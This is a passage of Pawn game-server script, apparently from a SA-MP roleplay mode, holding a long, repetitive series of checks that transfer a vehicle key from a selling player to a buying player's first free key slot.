					    if(myvehh != personalcar[11][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 12;
					}
					if(primesccar[playerid] == 13)
					{
					    if(vehh != personalcar[12][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[12][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 13;
					}
					if(primesccar[playerid] == 14)
					{
					    if(vehh != personalcar[13][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[13][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 14;
					}
					if(primesccar[playerid] == 15)
					{
					    if(vehh != personalcar[14][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[14][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 15;
					}
					if(PlayerInfo[playerid][pPcarkey] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pPcarkey] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pPcarkeyx);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 1;
					}
					else if(PlayerInfo[playerid][pmotokey] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pmotokey] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pmotokeyx);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 2;
					}
					else if(PlayerInfo[playerid][pprcarkey] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pprcarkey] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pprcarkeyx);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 3;
					}
					else if(PlayerInfo[playerid][pprcarkey2] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pprcarkey2] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pprcarkey2x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 4;
					}
					else if(PlayerInfo[playerid][pPPluscarkey] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pPPluscarkey] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pPPluscarkeyx);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 5;
					}
					else if(PlayerInfo[playerid][pPPluscarkey2] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pPPluscarkey2] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pPPluscarkey2x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 6;
					}
					else if(PlayerInfo[playerid][pCarkey7] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
